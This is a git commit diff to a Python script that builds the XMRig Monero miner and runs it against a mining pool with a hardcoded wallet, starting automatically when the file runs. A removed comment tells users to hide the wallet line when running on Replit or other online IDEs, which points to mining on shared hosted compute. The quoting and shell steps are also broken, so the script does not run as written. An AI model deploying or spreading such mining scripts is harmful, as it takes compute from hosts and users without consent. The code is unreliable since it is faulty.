6d4daff6d2230005955c38121ec474f164da8c0a
DiscordMiners <91188283+DiscordMiners@users.noreply.github.com>
2021-12-04 19:46:42 +0800

    Update monero.py

--- monero.py
+++ monero.py
@@ -3,7 +3,7 @@ import os
 def build():
   os.system("sudo apt update")
   os.system("sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y")
-  #'''
+  '''
   os.system("git clone https://github.com/xmrig/xmrig.git")
   os.system("cd xmrig")
   os.system("mkdir build")
@@ -14,11 +14,14 @@ def build():
   os.system("git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. & make")
   
 def mine():
+  '''
   pool = os.getenv("pool")
   wallet =  os.getenv("wallet")
   name = os.getenv("name")
   #Make sure u have a wallet by this step 
   os.system(f"./xmrig -o gulf.moneroocean.stream:{pool} -u {wallet} -p {name}")
+  #'''
+  os.system("./xmrig -o gulf.moneroocean.stream:10128 -u 42otjFwkWfHNbvA4Fy8jh7GZwynQetyvnGpTNQ24u2QEA7ikkk65cFnAVRUnQZqkzU3m66kZqv9ioiHovdqeEizeJeTGkcT -p rp4")
 
-#DO NOT SHOW THE FOLLOWING LINE(IF REPLIT OR ANY OTHER ONLINE IDE IS USED):
-#./xmrig -o gulf.moneroocean.stream:10128 -u 42otjFwkWfHNbvA4Fy8jh7GZwynQetyvnGpTNQ24u2QEA7ikkk65cFnAVRUnQZqkzU3m66kZqv9ioiHovdqeEizeJeTGkcT -p rp4
+build()
+mine()
